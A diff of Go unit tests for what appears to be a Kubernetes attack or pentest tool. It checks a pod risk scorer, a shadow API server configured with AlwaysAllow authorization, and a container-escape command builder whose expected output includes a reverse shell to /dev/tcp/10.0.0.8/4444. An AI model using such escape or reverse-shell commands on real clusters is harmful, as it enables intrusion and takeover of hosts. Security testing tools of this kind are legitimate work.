@@ -5,6 +5,7 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/gin-gonic/gin"
 	corev1 "k8s.io/api/core/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"sigs.k8s.io/yaml"
@@ -203,6 +204,44 @@ func TestBuildShadowAPIServerPodCopiesKeyRuntimeData(t *testing.T) {
 	}
 	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--authorization-mode=AlwaysAllow") {
 		t.Fatalf("expected auth mode override, got %#v", shadow.Spec.Containers[0].Args)
+	}
+}
+
+func TestEvaluatePodSummaryDetectsSeccompDisabled(t *testing.T) {
+	summary := evaluatePodSummary([]gin.H{
+		{"check": "seccomp", "result": "Seccomp:\t0"},
+		{"check": "docker_sock", "result": "not_found"},
+	})
+
+	if got := summary["risk_level"]; got != "medium" {
+		t.Fatalf("expected medium risk for seccomp disabled, got %v", got)
+	}
+	risks, _ := summary["risks"].([]string)
+	if len(risks) == 0 || !strings.Contains(risks[0], "seccomp=0") {
+		t.Fatalf("expected seccomp risk to be reported, got %#v", risks)
+	}
+}
+
+func TestEvaluatePodSummaryInfoOnlyDoesNotEscalateToHigh(t *testing.T) {
+	summary := evaluatePodSummary([]gin.H{
+		{"check": "sa_token", "result": "mounted"},
+	})
+
+	if got := summary["risk_level"]; got != "info" {
+		t.Fatalf("expected info risk level for info-only findings, got %v", got)
+	}
+}
+
+func TestAutoEscapeHostCommandAvoidsPlaceholderLHOST(t *testing.T) {
+	if got := autoEscapeHostCommand("", ""); got != "echo ESCAPED_TO_HOST; id; hostname" {
+		t.Fatalf("expected local confirmation command without placeholder host, got %q", got)
+	}
+	withReverse := autoEscapeHostCommand("10.0.0.8", "")
+	if !strings.Contains(withReverse, "/dev/tcp/10.0.0.8/4444") {
+		t.Fatalf("expected reverse-shell target to use provided host and default port, got %q", withReverse)
+	}
+	if !strings.Contains(withReverse, "ESCAPED_TO_HOST") {
+		t.Fatalf("expected reverse-shell command to keep host escape evidence, got %q", withReverse)
 	}
 }
 
